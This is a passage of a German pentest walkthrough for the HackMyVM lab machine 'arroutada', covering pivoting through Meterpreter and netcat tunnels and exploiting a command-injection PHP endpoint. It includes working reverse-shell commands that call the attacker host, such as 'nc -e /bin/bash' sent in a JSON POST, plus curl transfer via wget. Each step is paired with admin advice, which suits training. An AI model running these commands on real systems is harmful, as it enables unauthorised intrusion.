+            *   Port 80 (HTTP): Lauscht auf allen Interfaces (`*`), wird von Apache2 verwendet.
+            Ein interner Dienst, der als Benutzer `drito` auf Port 8000 läuft, ist ein primäres Ziel für weitere Untersuchung und potenzielle Privilege Escalation.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Interagieren Sie mit dem Dienst auf `127.0.0.1:8000`. Da er nur lokal lauscht, benötigen Sie entweder ein Tool wie `curl` direkt auf der Zielmaschine oder müssen Port Forwarding / Tunneling einrichten (z.B. mit SSH, Meterpreter, Chisel, nc), um vom Angreifer-System darauf zugreifen zu können.
+            <br><strong>Empfehlung (Admin):</strong> Untersuchen Sie den Dienst auf Port 8000. Stellen Sie sicher, dass er sicher konfiguriert ist und keine unnötigen Privilegien hat. Wenn er nur lokal benötigt wird, ist die Bindung an `127.0.0.1` korrekt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Prompt, Shell vom Zielsystem -->
+                      <pre>ss -tulpe
+
+Netid State  Recv-Q Send-Q Local Address:Port   Peer Address:PortProcess
+udp   UNCONN 0      0            0.0.0.0:bootpc      0.0.0.0:*    ino:11378 sk:1 cgroup:/system.slice/ifup@enp0s3.service <->
+tcp   LISTEN 0      20         127.0.0.1:smtp        0.0.0.0:*    ino:11643 sk:2 cgroup:/system.slice/exim4.service <->
+tcp   LISTEN 0      4096       127.0.0.1:8000        0.0.0.0:*    uid:1001 ino:12129 sk:3 cgroup:/system.slice/cron.service <->
+tcp   LISTEN 0      511                *:http              *:*    ino:11668 sk:4 cgroup:/system.slice/apache2.service v6only:0 <->
+tcp   LISTEN 0      20             [::1]:smtp           [::]:*    ino:11644 sk:5 cgroup:/system.slice/exim4.service v6only:1 <->
+</pre>
+                      <pre>ss -lntp
+
+State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
+LISTEN 0      20         127.0.0.1:25        0.0.0.0:*
+LISTEN 0      4096       127.0.0.1:8000      0.0.0.0:*
+LISTEN 0      511                *:80              *:*
+LISTEN 0      20             [::1]:25           [::]:*
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Um mit dem lokalen Dienst auf Port 8000 interagieren zu können, wird das `curl`-Binary vom Angreifer-System auf das Zielsystem übertragen.
+            1.  `cp /usr/bin/curl .`: Kopiert `curl` in das aktuelle Verzeichnis auf dem Angreifer-System.
+            2.  `python3 -m http.server 8081`: Startet einen einfachen HTTP-Server auf Port 8081 im Verzeichnis, das `curl` enthält, auf dem Angreifer-System.
+            3.  `/usr/bin/wget http://192.168.2.114:8081/curl`: Führt `wget` auf dem Zielsystem (innerhalb der `www-data`-Shell) aus, um `curl` vom Angreifer-System herunterzuladen.
+            4.  Die Ausgabe des Python-Servers auf dem Angreifer-System bestätigt den erfolgreichen Download.
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Übertragen von `curl` auf das Zielsystem ist erfolgreich. Dies ermöglicht es nun, HTTP-Anfragen an den lokalen Dienst auf Port 8000 von der `www-data`-Shell aus zu senden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Machen Sie die heruntergeladene `curl`-Datei ausführbar (`chmod +x curl`) und verwenden Sie sie, um Anfragen an `127.0.0.1:8000` zu senden.
+            <br><strong>Empfehlung (Admin):</strong> Beschränken Sie die Möglichkeit für nicht-privilegierte Benutzer wie `www-data`, Dateien herunterzuladen und auszuführen. Überwachen Sie ausgehende Netzwerkverbindungen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cp /usr/bin/curl .</span></div>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 -m http.server 8081</span></div>
+                     <pre>Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Prompt, Shell vom Zielsystem -->
+                      <pre>/usr/bin/wget http://192.168.2.114:8081/curl</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 -m http.server 8081</span></div>
+                     <pre>
+Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
+192.168.2.124 - - [08/Apr/2023 17:17:19] "GET /curl HTTP/1.1" 200 -</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Das heruntergeladene `curl`-Binary wird ausführbar gemacht und verwendet, um eine GET-Anfrage an den lokalen Dienst auf `127.0.0.1:8000` zu senden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Dienst auf Port 8000 antwortet mit einer Zeichenkette aus Brainfuck-Code. Brainfuck ist eine esoterische Programmiersprache. Der Code muss dekodiert werden, um seine Bedeutung zu verstehen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kopieren Sie den Brainfuck-Code und verwenden Sie einen Online-Decoder oder ein lokales Tool (z.B. https://copy.sh/brainfuck/text.html), um ihn zu entschlüsseln.
+            <br><strong>Empfehlung (Admin):</strong> Interne Dienste sollten keine obskuren oder potenziell hinweisgebenden Nachrichten wie diese zurückgeben.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt, Shell vom Zielsystem -->
+                    <pre>chmod +x curl</pre>
+                    <pre>./curl -X GET 127.0.0.1:8000</pre>
+                    <pre>--[----->+<]>-----.+++++++++++..[++>---<]>--.++++[->++<]>.[--->++++<]>+.++.++++++++.++++[->+++<]>.-[++++>---<]>.>+[--->++<]>.---------.-----[->++++<]>.-[--->++<]>--.-------.++.++++++++.------.+++++++++++++.+.+[-->+++++<]>-..</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Brainfuck-Code von Port 8000 wird mithilfe eines Online-Tools (https://copy.sh/brainfuck/text.html) dekodiert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die dekodierte Nachricht lautet: `all HackMyVM hackers!!`. Dies ist eine Grußbotschaft, aber kein direkter Hinweis für den nächsten Schritt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da die GET-Anfrage keine weiteren Hinweise liefert, versuchen Sie andere HTTP-Methoden (POST) oder suchen Sie nach bekannten Schwachstellen des Dienstes (falls identifizierbar) oder nach weiteren Endpunkten unter Port 8000. Der spätere Text deutet auf einen Endpunkt `/priv.php` hin.
+            <br><strong>Empfehlung (Admin):</strong> Entfernen Sie solche Nachrichten von internen Diensten.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt, Referenz auf Decoder und Ergebnis -->
+                    <pre>
+https://copy.sh/brainfuck/text.html
+all HackMyVM hackers!!</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Hier wird Metasploit verwendet, um die bestehende Reverse Shell (`www-data`) zu einer Meterpreter-Session aufzuwerten. Meterpreter bietet mehr Funktionalität und Stabilität.
+            1.  `use 54` / `use post/multi/manage/shell_to_meterpreter`: Wählt das entsprechende Post-Exploitation-Modul.
+            2.  `show options`: Zeigt die Optionen des Moduls.
+            3.  `show sessions`: Listet aktive Sessions auf (Session 1 ist die `www-data`-Shell).
+            4.  `set handler true`, `set lport 4433`, `set session 1`: Konfiguriert das Modul, um einen neuen Listener auf Port 4433 zu starten und die vorhandene Session 1 aufzuwerten.
+            5.  `run`: Führt das Modul aus.
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Modul wird erfolgreich ausgeführt. Es startet einen Handler auf Port 4433, sendet den Meterpreter-Payload an die bestehende Shell (Session 1) und öffnet eine neue Meterpreter-Session (Session 2) als `www-data`. Die ursprüngliche Shell (Session 1) bleibt ebenfalls bestehen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Interagieren Sie mit der neuen Meterpreter-Session (`sessions -i 2`). Nutzen Sie Meterpreter-Befehle für weitere Enumeration, Dateitransfers, Port Forwarding etc.
+            <br><strong>Empfehlung (Admin):</strong> Intrusion Detection Systems (IDS) können versuchen, Meterpreter-Payloads oder -Kommunikation zu erkennen. Die Behebung der ursprünglichen Schwachstelle (Webshell) verhindert diesen Schritt.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt, implizite Eingabe -->
+                    <pre>Interact with a module by name or index. For example info 76, use 76 or use post/windows/manage/exec_powershell</pre>
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/handler) > <span class="command">use 54</span></div>
+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">show options</span></div>
+                    <pre>
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connect
+                                       ion
+   LHOST                     no        IP of host that will receive the connection from the
+                                       payload (Will try to auto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION                   yes       The session to run this module on</pre>
+                   <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">show sessions</span></div>
+                   <pre>
+Active sessions
+===============
+
+  Id  Name  Type             Information  Connection
+  --  ----  ----             -----------  ----------
+  1         shell sparc/bsd               192.168.2.114:4444 -> 192.168.2.124:54334 (192.168
+                                          .2.124)</pre>
+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">set handler true</span></div>
+                    <pre>handler => true</pre>
+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">set lport 4433</span></div>
+                    <pre>lport => 4433</pre>
+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">set session 1</span></div>
+                    <pre>session => 1</pre>
+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">run</span></div>
+                    <pre>
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 192.168.2.114:4433
+[*] Sending stage (1017704 bytes) to 192.168.2.124
+[*] Meterpreter session 2 opened (192.168.2.114:4433 -> 192.168.2.124:57734) at 2023-04-09 00:31:25 +0200
+[*] Command stager progress: 100.00% (773/773 bytes)
+[*] Post module execution completed</pre>
+                     <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">show sessions</span></div>
+                     <pre>
+Active sessions
+===============
+
+  Id  Name  Type                   Information               Connection
+  --  ----  ----                   -----------               ----------
+  1         shell sparc/bsd                                  192.168.2.114:4444 -> 192.168.2
+                                                             .124:54334 (192.168.2.124)
+  2         meterpreter x86/linux  www-data @ 192.168.2.124  192.168.2.114:4433 -> 192.168.2
+                                                             .124:57734 (192.168.2.124)</pre>
+                    <div class="prompt metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) > <span class="command">sessions -i 2</span></div>
+                    <pre>[*] Starting interaction with 2...</pre>
+                     <div class="prompt metasploit-prompt">meterpreter > <span class="command">sysinfo</span></div>
+                     <pre>
+Computer     : 192.168.2.124
+OS           : Debian 11.6 (Linux 5.10.0-20-amd64)
+Architecture : x64
+BuildTuple   : i486-linux-musl
+Meterpreter  : x86/linux</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Innerhalb der Meterpreter-Session werden Befehle ausgeführt, um den Zugriff auf den lokalen Dienst auf Port 8000 vom Angreifer-System aus zu ermöglichen.
+            *   `run autoroute -s 127.0.0.1/24` (oder `run post/multi/manage/autoroute SUBENETS=127.0.0.1/24 SESSION=2`): Richtet eine Route im Metasploit-Framework ein, sodass Netzwerkverkehr, der für das `127.0.0.1/24`-Netzwerk des Ziels bestimmt ist, durch die Meterpreter-Session (Session 2) geleitet wird.
+            *   `portfwd add -l 8000 -p 8000 -r 127.0.0.1`: Leitet den lokalen Port 8000 auf dem Angreifer-System an den Port 8000 auf dem Zielsystem (`127.0.0.1`) weiter, ebenfalls durch die Meterpreter-Session.
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Autoroute und Port Forwarding sind erfolgreich eingerichtet. Der Angreifer kann nun auf seinem eigenen System `http://127.0.0.1:8000` aufrufen, und die Anfrage wird an den internen Dienst auf dem Zielsystem weitergeleitet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Greifen Sie nun von Ihrem Angreifer-System aus auf `http://127.0.0.1:8000` zu, um direkt mit dem internen Dienst zu interagieren. Verwenden Sie `curl` oder einen Browser.
+            <br><strong>Empfehlung (Admin):</strong> Die Behebung der initialen Schwachstelle verhindert diese Schritte. Netzwerk-Monitoring auf dem Ziel kann ungewöhnliche Routing- oder Tunneling-Aktivitäten erkennen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt metasploit-prompt">meterpreter > <span class="command">run autoroute -s 127.0.0.1/24</span></div>
+                      <pre>
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+[*] Adding a route to 127.0.0.1/255.255.255.0...
+[+] Added route to 127.0.0.1/255.255.255.0 via 192.168.2.124
+[*] Use the -p option to list all active routes</pre>
+                      <div class="prompt metasploit-prompt">meterpreter > <span class="command">portfwd add -l 8000 -p 8000 -r 127.0.0.1</span></div>
+                      <pre>[*] Local TCP relay created: :8000 <-> 127.0.0.1:8000</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Angreifer greift von seinem System auf den weitergeleiteten Port `http://127.0.0.1:8000` zu. Der Dienst antwortet wieder mit einer Brainfuck-Nachricht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Port Forward funktioniert. Die neue Brainfuck-Nachricht muss dekodiert werden. Die dekodierte Nachricht lautet: `drito`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> `drito` ist der Benutzername (UID 1001), dem der Dienst auf Port 8000 gehört. Dies bestätigt den Kontext des Dienstes. Suchen Sie nach Möglichkeiten, Befehle über diesen Dienst als `drito` auszuführen.
+            <br><strong>Empfehlung (Admin):</strong> Der Dienst gibt interne Benutzernamen preis, was vermieden werden sollte.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Prompt, Zugriff auf weitergeleiteten Port und Brainfuck-Antwort -->
+                     <pre>
+http://127.0.0.1:8000/
+
+Service under maintenance
+
+This site is from ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>---.+++++++++++..<<++.>++.>-----------.++.++++++++.<+++++.>++++++++++++++.<+++++++++.---------.<.>>-----------------.-------.++.++++++++.------.+++++++++++++.+.<<+..</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `portfwd list` in Meterpreter listet die aktiven Portweiterleitungen auf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass die Weiterleitung von lokal Port 8000 auf dem Angreifer-System zu `127.0.0.1:8000` auf dem Ziel aktiv ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Weiterleitung steht bereit für weitere Interaktionen.
+            <br><strong>Empfehlung (Admin):</strong> Administrative Aktion, keine direkte Schwachstelle.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt metasploit-prompt">meterpreter > <span class="command">portfwd list</span></div>
+                     <pre>
+Active Port Forwards
+====================
+
+   Index  Local           Remote        Direction
+   -----  -----           ------        ---------
+   1      127.0.0.1:8000  0.0.0.0:8000  Forward
+
+1 total active port forwards.</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan wird auf die IP des Angreifer-Systems (`192.168.2.114`) durchgeführt. Dies geschieht oft, um zu überprüfen, welche Ports durch Port Forwarding oder Listener auf dem Angreifer-System offen sind.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet Port 8000 (die Meterpreter-Portweiterleitung) und Port 8081 (den Python-HTTP-Server, der zum Übertragen von `curl` verwendet wurde) auf dem Angreifer-System offen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dies bestätigt die offenen Ports auf der eigenen Maschine. Kein direkter Schritt im Angriff auf das Ziel.
+            <br><strong>Empfehlung (Admin):</strong> Dies ist eine Aktion auf dem Angreifer-System.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/docs]
+└─# <span class="command">nmap 192.168.2.114 -p-</span></div>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-09 00:42 CEST
+Nmap scan report for hacker1908 (192.168.2.114)
+Host is up (0.0000010s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE
+8000/tcp open  http-alt
+8081/tcp open  blackice-icecap</pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Eine weitere Reverse Shell (`nc -lvnp 9002`) wird gestartet und stabilisiert (`SHELL=/bin/bash script -q /dev/null`, `stty raw -echo; fg`, `export TERM`, `stty rows cols`). Es ist unklar, warum dies geschieht, da bereits eine Meterpreter-Session besteht. Möglicherweise als Backup oder um eine reinere Shell-Umgebung zu haben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Eine zweite Shell als `www-data` wird etabliert und stabilisiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie entweder die Meterpreter-Session oder diese stabilisierte Shell für die nächsten Schritte.
+            <br><strong>Empfehlung (Admin):</strong> Administrative Aktion auf dem Angreifer-System und Folge des initialen Zugriffs.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">nc -lvnp 9002</span></div>
+                      <pre>
+listening on [any] 9002 ...
+connect to [192.168.2.114] from (UNKNOWN) [192.168.2.124] 55206
+SHELL=/bin/bash script -q /dev/null</pre>
+                      <div class="prompt">www-data@arroutada:/var/www/html$ </div>
+                 </div>
+             </div>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                      <pre>
+[1]  + continued  nc -lvnp 9002
+                               reset</pre>
+                      <!-- Beispielhafte Benutzerinteraktion nach Stabilisierung -->
+                      <pre>Terminal type? ^Z
+[1]+  Stopped                 reset</pre>
+                      <div class="prompt">www-data@arroutada:/var/www/html$ <span class="command">ls</span></div>
+                      <pre>imgs  index.html  scout  thejabasshell.php</pre>
+                      <div class="prompt">www-data@arroutada:/var/www/html$ <span class="command">export TERM=xterm</span></div>
+                      <div class="prompt">www-data@arroutada:/var/www/html$ <span class="command">stty rows 32 cols 169</span></div>
+                      <div class="prompt">www-data@arroutada:/var/www/html$ </div>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Zielsystem (`www-data`-Shell) wird ein einfacher TCP-Proxy oder Tunnel mit `nc` erstellt: `nc -nlktp 8001 -c "nc 127.0.0.1 8000"`. Dieser Befehl lauscht auf Port 8001 auf allen Interfaces. Jede eingehende Verbindung auf Port 8001 wird an `127.0.0.1:8000` weitergeleitet. Dies ist eine Alternative zum Meterpreter Port Forwarding, um den internen Dienst von außen erreichbar zu machen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Tunnel wird erfolgreich gestartet. Nun kann der Angreifer direkt auf `http://192.168.2.124:8001` zugreifen, um mit dem internen Dienst zu interagieren.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie `curl` oder einen Browser, um Anfragen an `http://192.168.2.124:8001` zu senden.
+            <br><strong>Empfehlung (Admin):</strong> Überwachen Sie die Erstellung von lauschenden Sockets durch nicht-privilegierte Benutzer. Die Behebung der initialen Schwachstelle verhindert dies.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@arroutada:/tmp$ <span class="command">nc -nlktp 8001 -c "nc 127.0.0.1 8000"</span></div>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Angreifer verwendet `curl`, um über den erstellten Tunnel auf Port 8001 zuzugreifen.
+            *   Erste Anfrage an `/`: Gibt die Brainfuck-Nachricht zurück, aber im HTML-Quelltext ist ein wichtiger Kommentar sichtbar: `<!-- Please sanitize /priv.php -->`.
+            *   Zweite und dritte Anfrage an `/priv.php`: Versucht, auf den im Kommentar erwähnten Endpunkt zuzugreifen. Es wird ein Fehler zurückgegeben, der besagt, dass der Parameter "command" im Request Body fehlt. Der Quellcode der PHP-Datei wird ebenfalls angezeigt.
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der HTML-Kommentar auf der Hauptseite des internen Dienstes verrät den kritischen Endpunkt `/priv.php`. Die Fehlermeldung und der Quellcode von `/priv.php` zeigen, dass dieses Skript einen JSON-Parameter namens `command` im POST-Body erwartet und den Wert dieses Parameters direkt an die `system()`-Funktion übergibt. Dies ist eine klassische Command Injection-Schwachstelle.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Senden Sie eine POST-Anfrage an `http://192.168.2.124:8001/priv.php` mit dem `Content-Type: application/json` Header und einem JSON-Body wie `{"command": "ihr_befehl_hier"}`. Da der Dienst als Benutzer `drito` läuft, können Sie so Befehle als `drito` ausführen. Ziel ist es, eine Reverse Shell als `drito` zu erhalten.
+            <br><strong>Empfehlung (Admin):</strong> Entfernen Sie den Endpunkt `/priv.php` oder beheben Sie die Command Injection-Schwachstelle dringend! Niemals Benutzereingaben direkt an `system()` oder ähnliche Funktionen übergeben. Validieren und sanitisieren Sie alle Eingaben. Entfernen Sie Kommentare, die interne Pfade oder Schwachstellen verraten.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.124:8001"</span></div>
+                     <pre>
+<h1>Service under maintenance</h1>
+
+
+<br>
+
+
+<h6>This site is from ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>---.+++++++++++..<<++.>++.>-----------.++.++++++++.<+++++.>++++++++++++++.<+++++++++.---------.<.>>-----------------.-------.++.++++++++.------.+++++++++++++.+.<<+..</h6>
+
+<!-- Please sanitize /priv.php --></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.124:8001"/priv.php</span></div>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.124:8001/priv.php"</span></div>
+                      <pre>
+Error: the "command" parameter is not specified in the request body.
+
+/*
+
+$json = file_get_contents('php://input');
+$data = json_decode($json, true);
+
+if (isset($data['command'])) {
+    system($data['command']);
+} else {
+    echo 'Error: the "command" parameter is not specified in the request body.';
+}
+
+*/</pre>
+                 </div>
+             </div>
+
+             <!-- POC Abschnitt 1 beginnt hier -->
+             <section id="poc-internal-service">
+                 <h2>Proof of Concept (Internal Service Exploitation to User 'drito')</h2>
+                 <p class="analysis"><strong>Kurzbeschreibung:</strong> Ein interner Webdienst läuft als Benutzer `drito` auf `127.0.0.1:8000`. Dieser Dienst enthält eine versteckte PHP-Datei (`/priv.php`), die eine Command Injection-Schwachstelle aufweist. Durch Senden einer speziell formatierten POST-Anfrage an diesen Endpunkt (über einen Tunnel oder Port Forward) können Befehle als Benutzer `drito` ausgeführt werden.</p>
+                 <p class="analysis"><strong>Voraussetzungen:</strong>
+                     <ul>
+                         <li>Initial Access als `www-data`.</li>
+                         <li>Fähigkeit, auf den internen Dienst auf `127.0.0.1:8000` zuzugreifen (z.B. über `curl` auf dem Ziel, Tunnel, Port Forwarding).</li>
+                         <li>Kenntnis des verwundbaren Endpunkts `/priv.php`.</li>
+                         <li>Kenntnis der Schwachstelle (Command Injection via JSON POST).</li>
+                     </ul>
+                 </p>
+                 <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong></p>
+
+                 <p class="analysis"><strong>1. Vorbereiten des Listeners:</strong> Auf dem Angreifer-System wird ein Netcat-Listener gestartet, um die eingehende Reverse Shell vom Benutzer `drito` zu empfangen.</p>
+                 <p class="evaluation"><strong>Bewertung:</strong> Der Listener ist bereit.</p>
+                 <div class="code-block">
+                     <div class="terminal">
+                          <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                          <pre>listening on [any] 9001 ...</pre>
+                     </div>
+                 </div>
+
+                 <p class="analysis"><strong>2. Ausführen der Command Injection:</strong> Eine POST-Anfrage wird mit `curl` an den verwundbaren Endpunkt `/priv.php` (erreichbar über den Tunnel auf Port 8001) gesendet.
+                 *   `-XPOST`: Sendet eine POST-Anfrage.
+                 *   `-H "Content-Type: application/json"`: Setzt den notwendigen Header.
+                 *   `-d '{"command":"nc -e /bin/bash 192.168.2.114 9001"}'`: Sendet den JSON-Body mit dem Reverse-Shell-Befehl als Wert für den `command`-Parameter.
+                 </p>
+                 <p class="evaluation"><strong>Bewertung:</strong> Die Anfrage wird erfolgreich verarbeitet. Das Skript `/priv.php` führt den übergebenen `nc`-Befehl als Benutzer `drito` aus.</p>
+                 <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie den Netcat-Listener auf die eingehende Verbindung.
+                 <br><strong>Empfehlung (Admin):</strong> Beheben Sie die Command Injection in `/priv.php`.</p>
+                 <div class="code-block">
+                     <div class="terminal">
+                          <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -XPOST http://192.168.2.124:8001/priv.php -H "Content-Type: application/json" -d '{"command":"nc -e /bin/bash 192.168.2.114 9001"}'</span></div>
+                     </div>
+                 </div>
+
+                 <p class="analysis"><strong>3. Empfangen der Shell als 'drito':</strong> Der Netcat-Listener auf dem Angreifer-System empfängt die Verbindung vom Ziel. Der `id`-Befehl bestätigt, dass die Shell nun als `drito` (UID 1001) läuft.</p>
+                 <p class="evaluation"><strong>Bewertung:</strong> Erfolgreiche Privilege Escalation von `www-data` zu `drito` durch Ausnutzung des internen Dienstes.</p>
+                 <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell als `drito` und suchen Sie nach Wegen, um zu `root` zu eskalieren.
+                 <br><strong>Empfehlung (Admin):</strong> Beheben Sie die Command Injection. Überprüfen Sie die Berechtigungen und die Sicherheit aller internen Dienste.</p>
+                  <div class="code-block">
+                      <div class="terminal">
+                           <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                           <pre>
+listening on [any] 9001 ...
+connect to [192.168.2.114] from (UNKNOWN) [192.168.2.124] 46382
+id
+uid=1001(drito) gid=1001(drito) groups=1001(drito)</pre>
+                      </div>
+                  </div>
+                  <p class="evaluation"><strong>Risikobewertung:</strong> Mittel bis Hoch. Die Ausnutzung des internen Dienstes ermöglicht einem Angreifer mit niedrigem Zugriff (www-data) die Übernahme eines Benutzerkontos (drito), was oft weitere Privilegien mit sich bringt.</p>
+                  <p class="recommendation"><strong>Empfehlungen zur Behebung:</strong>
+                    <ol>
+                        <li>Beheben Sie die Command Injection-Schwachstelle in `/priv.php` durch Validierung und Sanitisierung der Eingaben oder besser durch Vermeidung der direkten Übergabe an `system()`.</li>
+                        <li>Entfernen Sie den aufschlussreichen Kommentar in der Hauptdatei des Dienstes.</li>
+                        <li>Überprüfen Sie den internen Dienst auf weitere Schwachstellen.</li>
+                        <li>Stellen Sie sicher, dass der Dienst mit minimal notwendigen Rechten läuft.</li>
+                    </ol>
+                 </p>
+             </section> <!-- POC Abschnitt 1 endet hier -->
+
+             <p class="analysis"><strong>Analyse:</strong> Die erhaltene Shell als `drito` wird stabilisiert (`script -q /dev/null`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Shell ist nun besser nutzbar.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie `sudo -l` aus, um die sudo-Rechte für `drito` zu prüfen.
+             <br><strong>Empfehlung (Admin):</strong> Administrative Aktion des Angreifers.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, Shell vom Zielsystem -->
+                     <pre>SHELL=/bin/bash script -q /dev/null</pre>
+                     <div class="prompt">drito@arroutada:~$ </div>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `sudo -l` wird ausgeführt, um die `sudo`-Berechtigungen für den Benutzer `drito` zu überprüfen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Ein kritischer Fund! Der Benutzer `drito` darf den Befehl `/usr/bin/xargs` als jeder Benutzer (`ALL : ALL`) ohne Passwort (`NOPASSWD:`) ausführen. `xargs` kann verwendet werden, um Befehle aus der Standardeingabe zu erstellen und auszuführen. In Kombination mit `sudo` ist dies eine bekannte Methode zur Privilege Escalation.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die `sudo xargs`-Berechtigung aus, um Root-Rechte zu erlangen. Suchen Sie auf GTFOBins nach dem entsprechenden Exploit für `xargs`.
+             <br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie `sudo` nach dem Prinzip der geringsten Rechte. Erlauben Sie niemals `NOPASSWD` für Befehle wie `xargs`, die zur Ausführung beliebiger anderer Befehle missbraucht werden können. Entfernen Sie diese unsichere `sudo`-Regel.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">drito@arroutada:~$ <span class="command">sudo -l</span></div>
+                      <pre>
+Matching Defaults entries for drito on arroutada:
+    env_reset, mail_badpass,
